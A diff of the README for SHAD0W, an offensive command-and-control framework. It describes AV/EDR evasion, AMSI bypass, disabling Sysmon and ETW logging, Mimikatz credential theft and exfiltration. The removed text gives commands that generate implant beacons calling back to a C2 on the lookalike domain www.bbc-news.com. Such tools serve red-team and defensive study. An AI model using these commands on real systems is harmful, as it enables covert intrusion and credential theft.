@@ -1,125 +1,50 @@
-<p align="center">
-  <img alt="pwndrop logo" src="shad0w.jpg" />
-</p>
-
-# shad0w
-
 [![Project Status](https://img.shields.io/badge/status-BETA-yellow?style=flat-square)]()
 
-shad0w is a post exploitation framework designed to operate covertly on heavily monitored environments
+# SHAD0W
 
-### Features
+<p align="center">
+  <img alt="shad0w logo" src="shad0w.png" />
+</p>
 
-#### C2 Server
+SHAD0W is a modular C2 framework designed to successfully operate on mature enviroments.
 
-- Secure communication over HTTPS.
-- Clone and live proxy any website, making the C2 fully browsable.
+It will use a range of methods to evade EDR and AV while allowing the operator to continue using tooling an tradecraft they are familiar with. Its powered by Python 3.8 and C, using [Donut](https://github.com/TheWover/donut) for payload generation. By using Donut along side the process injection capabilities of SHAD0W it gives the operator the ability to execute .NET assemblies, EXEs, DLLs, VBS, JS or XSLs fully inside memory. Dynamically resolved syscalls are heavily used to avoid userland API hooking, anti DLL injection to make it harder for EDR to load code into the beacons and offical microsoft mitigation methods to protect spawn processes.
 
-#### Beacons
+Main features of the SHAD0W C2 are:
 
-- Staged and static beacons
-- Shellcode and powershell formats allow for completely fileless attacks
-- Uses native windows syscalls
-- Bypasses userland API hooking
-- Blocks EDR from loading DLLs into its process
-- Can execute .NET assemblies, EXEs, DLLs, VBS, JS or XSL files completely in memory
-- Common privilege escalation exploits built in
-- Interact with the file system
-- Configurable C2 callback jitter
+- **Built For Docker** - It runs fully inside docker allowing cross platform usage
+- **Live Proxy & Mirror** - The C2 server is able to mirror any website in real time, relaying all non C2 traffic to that site making it look less subject when viewed in a web browser
+- **HTTPS C2 Communication** - All traffic between beacons and the C2 will be encrypted and transmitted over HTTPS
+- **Modern CLI** - The CLI is built on [prompt-toolkit](https://github.com/prompt-toolkit/python-prompt-toolkit)
+- **JSON Based Protocol** - Custom beaons are able to built and used easily with an easy to implement protocol
+- **Extremely Modular** - Easy to create new modules to interact and task beacons
 
-#### Modules
+Main features of SHAD0W beacons are:
 
-- [GhostPack](https://github.com/GhostPack)
-- [mimikatz](https://github.com/gentilkiwi/mimikatz)
-- [SharpSocks](https://github.com/nettitude/SharpSocks)
+- **Shellcode, EXE, Powershell & More** - Beacons can be generated and used in many different formats
+- **Process Injection** - Allowing you to `migrate`, `shinject`, `dllinject` and more
+- **Bypass AV** - Payloads are frequently updated to evade common Anti-Virus products
+- **Highly configurable** - Custom jitters, user agents and more
+- **Proxy Aware** - All callbacks will use the current system proxy
+- **HTTPS C2 Communication** - Traffic to and from the C2 is encrypted via HTTPS
 
-### Coming Soon
+Current Modules:
 
-- Unmanaged powershell
-- Syscalls for older versions of windows
-- Kernel mode capability
-- More privilege escalation exploits
-- Ghost in the logs integration
-- UAC bypasses
-- Persistence
-- 32 bit support
-- More beacon formats
+- **GhostPack** - With the binarys compiled nightly via an Azure pipeline. Thanks to [@Flangvik](https://twitter.com/Flangvik)
+- **Unmanaged Powershell** - With built in AMSI bypass
+- **Ghost In The Logs** - Disable ETW & Sysmon, more info can be found [here](https://blog.dylan.codes/evading-sysmon-and-windows-event-logging/)
+- **Elevate** - Built in PrivEsc exploits
+- **SharpSocks** - Reverse socks proxy over HTTPS
+- **SharpCollection** - A ton of .NET offensive tools, more info can be found [here](https://github.com/Flangvik/SharpCollection)
+- **Mimikatz** - For all your credential theft needs
+- **Upload & Download** - Easy data exfiltration
+- **StdAPI** - Common commands to interact with the file system
 
-### Install
-
-To install shad0w run the two commands below, making sure you already have docker installed on your system.
+## Install
 
     $ git clone --recurse-submodules https://github.com/bats3c/shad0w.git && cd shad0w
     $ sudo ./shad0w install
 
-### Usage
+## Usage
 
-#### C2
-
-To start the C2 server and have it listening for connections you can use the command.
-
-    $ shad0w listen -e <endpoint>
-
-Where the `<endpoint>` is the IP address or domain name the C2 will be listening on. SSL certificates will also be dynamically generated.
-
-To use the website mirroring functionality you can use the `-m` or `--mirror` flag
-
-    $ shad0w listen -e www.bbc-news.com -m "https://www.bbc.com/"
-
-This will mean that if the C2s address of `www.bbc-news.com` is visited the content of `https://www.bbc.com/` will be retrieved and returned. This is also true for any links on the cloned website. If the person browsing the C2 navigated to `https://www.bbc-news.com/sport/football/52799575` the content at `https://www.bbc.com/sport/football/52799575` would be mirrored.
-
-#### Beacons
-
-*Only 64 bit beacons are currently supported*
-
-There are two types of beacons, `secure` and `insecure`. Secure beacons have all the mitigation and evasions techniques built in such syscalls and anti dll injection. These secure beacons are designed to work on the lastest versions of windows.
-
-The insecure beacons are designed to work on a wide variety of windows versions but are designed to be used in situations where detection does not matter.
-
-The syntax for beacon generation.
-
-    $ shad0w beacon -p <payload> -H <c2 address> -f <format> -o <filename>
-
-The format for payloads follows the following syntax
-
-    <arch>/<os>/<secure>/<static>
-
-So to generate a static 64 bit secure windows beacon it would be
-
-    x64/windows/secure/static
-
-Although it is recommended to use staged beacons so the command to generate a staged secure beacon in EXE format would be
-
-    $ shad0w beacon -p x64/windows/secure -H www.bbc-news.com -f exe -o beacon.exe
-
-Or for an insecure beacon it would be
-
-    $ shad0w beacon -p x64/windows -H www.bbc-news.com -f exe -o beacon.exe
-
-There are currently 3 different beacon formats; exe, shellcode and powershell
-The `-f` flags is used to control the different formats of the beacons.
-
-To generate a beacon in shellcode or powershell format you can use the `raw` or `psh` value respectively 
-
-    $ shad0w beacon -p x64/windows/secure -H www.bbc-news.com -f raw -o beacon.bin
-
-    $ shad0w beacon -p x64/windows/secure/static -H www.bbc-news.com -f psh -o beacon.ps1
-
-#### Interface
-
-To get a list of commands you can use the `help` command
-
-    shad0w ≫ help
-
-To get a list of active beacons you can use the `beacons` command
-
-    shad0w ≫ beacons
-
-To interact with a beacon use the `beacons` command with the `-i` flag specifying the beacon id
-
-    shad0w ≫ beacons -i 1
-
-### Credits
-
-- [JUMPSEC](https://www.jumpsec.com/) (for just generally being awesome)
-- [The Wover](https://twitter.com/TheRealWover) (cause donut is so good)
+https://labs.jumpsec.com/2020/06/03/shad0w/
